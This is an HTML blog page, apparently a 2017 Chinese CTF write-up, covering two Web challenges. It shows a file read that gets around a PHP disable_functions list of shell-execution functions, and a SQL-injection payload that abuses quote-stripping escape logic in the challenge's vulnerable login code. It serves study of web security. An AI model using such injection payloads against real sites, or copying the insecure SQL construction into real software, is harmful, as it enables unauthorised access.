@@ -1,0 +1,472 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>国赛的两个Web题 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="国赛的两个Web题">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-09-10 15:58" pubdate>
+        2017年9月10日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      887 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      12
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">国赛的两个Web题</h1>
+            
+            <div class="markdown-body">
+              <p>在全国大学生信息安全竞赛(线上赛)上划了波水，对我来说题目挺难的，好多姿势都没见过。</p>
+<a id="more"></a>
+
+<h2 id="0x00-两个最简单的Web的题解"><a href="#0x00-两个最简单的Web的题解" class="headerlink" title="0x00 两个最简单的Web的题解"></a>0x00 两个最简单的Web的题解</h2><h3 id="Web-PHP-execise"><a href="#Web-PHP-execise" class="headerlink" title="Web-PHP execise"></a>Web-PHP execise</h3><p>这个题目考察了PHP的几个简单的语法<br>首先在题目中执行phpinfo()函数<br><img src="https://image.mengsec.com/Web-PHPexcise-1.png" srcset="/img/loading.gif" alt="image"><br>在其中的找到被禁用的函数</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">disable_functions<br>assert,<span class="hljs-keyword">system</span>,passthru,<span class="hljs-keyword">exec</span>,pcntl_exec,shell_exec,<span class="hljs-keyword">popen</span>,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,<span class="hljs-keyword">fopen</span>,file_get_contents,<span class="hljs-keyword">fread</span>,file_get_contents,<span class="hljs-keyword">file</span>,readfile,opendir,readdir,closedir,rewinddir,<br></code></pre></td></tr></table></figure>
+<p>然后通过getcwd()函数获取服务器当前目录路径</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title">getcwd</span>()</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/Web-PHPexcise-2.png" srcset="/img/loading.gif" alt="image"><br>从而获取路径</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www/html<br></code></pre></td></tr></table></figure>
+<p>然后获取当前目录下的所有文件的文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs p&#39;h&#39;p">$dir&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;;print_r(scandir($dir))<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/Web-PHPexcise-3.png" srcset="/img/loading.gif" alt="image"><br>判断flag在flag_62cfc2dc115277d0c04ed0f74e48e3e9.php这个文件中，但是PHP几乎所有对文件操作的函数都被禁用了。在这时想到了以前表哥们给我们出题的时候，有的Web题的源码直接显示在网页上了，利用的show_source()函数.于是乎：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">include</span><span class="hljs-string">&quot;flag_62cfc2dc115277d0c04ed0f74e48e3e9.php&quot;</span>;<span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-string">&quot;flag_62cfc2dc115277d0c04ed0f74e48e3e9.php&quot;</span>)</span><br></code></pre></td></tr></table></figure>
+<p>从而获取flag</p>
+<p><img src="https://image.mengsec.com/Web-PHPexcise-4.png" srcset="/img/loading.gif" alt="image"></p>
+<h3 id="Web-wanna-to-see-your-hat"><a href="#Web-wanna-to-see-your-hat" class="headerlink" title="Web-wanna to see your hat?"></a>Web-wanna to see your hat?</h3><p>这题有毒，不拿到flag就给你10个绿帽子。。(╯‵□′)╯︵┻━┻</p>
+<p>主要考察的代码审计和SQL注入。首先有一个SVN源码泄露漏洞，利用工具将网站所有的源码下载下来，进行审计。关键代码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>=d_addslashes(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$_GET</span>=d_addslashes(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$array</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!is_array(<span class="hljs-variable">$value</span>))&#123;<br>            !get_magic_quotes_gpc() &amp;&amp; <span class="hljs-variable">$value</span>=addslashes(<span class="hljs-variable">$value</span>);<br>            waf(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>]=<span class="hljs-variable">$value</span>;<br>        &#125;   <br>    &#125;   <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-variable">$Filt</span> = <span class="hljs-string">&quot;\bUNION.+SELECT\b|SELECT.+?FROM&quot;</span>;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$Filt</span>.<span class="hljs-string">&quot;/is&quot;</span>,<span class="hljs-variable">$value</span>)==<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;found a hacker&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$value</span> = str_replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$value</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>  <span class="hljs-variable">$name</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, trim(waf(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>])));<br>  <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$name</span>) &gt; <span class="hljs-number">11</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from t_info where username = &#x27;<span class="hljs-subst">$name</span>&#x27; or nickname = &#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>])&#123;<br>      <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;hat&#x27;</span>] = <span class="hljs-string">&#x27;black&#x27;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;good job&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;hat&#x27;</span>] = <span class="hljs-string">&#x27;green&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>最终目的是令$_SESSION[‘hat’] = ‘black’;这也就意味着在执行SQL语句时，可以返回数据。但是，在register.php的插入语句为</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$sql = <span class="hljs-string">&quot;insert into t_user (username,nickname,password) values(&#x27;&quot;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>.$_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>].<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.md5($_POST[<span class="hljs-string">&#x27;password&#x27;</span>]).<span class="hljs-string">&quot;&#x27;)&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>它注册时写入数据的表与登陆时查询的表不是一个，这也把我的思路带偏了，我一开始认为，在register.php里面构造语句在t_info表中插入数据。但根据查到的资料显示，SQL只允许一个插入语句对一个表操作。没辙了。。去请教表哥们。<br>关键点在login.php，即登录界面。<br>关键语句</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$name = str<span class="hljs-constructor">_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-params">trim</span>(<span class="hljs-params">waf</span>($<span class="hljs-params">_POST</span>[<span class="hljs-string">&quot;name&quot;</span>])</span>));<br></code></pre></td></tr></table></figure>
+<p>在POST传入name时，如果传进的字符串中有“’”单引号，则会被加上反斜杠进行转义，然后在waf里面，若有空格则会被去掉。然后“&#39;”中的单引号被去掉，成为了“\”,若这个反斜杠在结尾，则会把 </p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> t_info <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span> <span class="hljs-keyword">or</span> nickname = <span class="hljs-string">&#x27;$name&#x27;</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
+<p>第一个name的第二个单引号转义，导致</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$name</span>&#x27; or nickname =</span><br></code></pre></td></tr></table></figure>
+<p>成为了字符串。因此令</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">name</span>==(<span class="hljs-number">0</span>)=<span class="hljs-number">1</span><span class="hljs-comment">#&#x27;	</span><br></code></pre></td></tr></table></figure>
+<p>最终执行的SQL语句为</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">from</span> t_info <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;=(0)=1#\&#x27; or nickname = &#x27;</span>=(<span class="hljs-number">0</span>)=<span class="hljs-number">1</span>#\<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure>
+<p>该语句为真，因此返回数据，使得$_SESSION[‘hat’] = ‘black’;从而返回flag<br><img src="https://image.mengsec.com/Web-green-1.png" srcset="/img/loading.gif" alt="image"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">全国大学生信息安全竞赛</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/09/10/%E7%81%AB%E7%A7%8DCTF%E6%80%BB%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">火种CTF总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/09/10/ourphp-v1-7-3-SQL-Injection/">
+                        <span class="hidden-mobile">Ourphp v1.7.3 SQL Injection</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
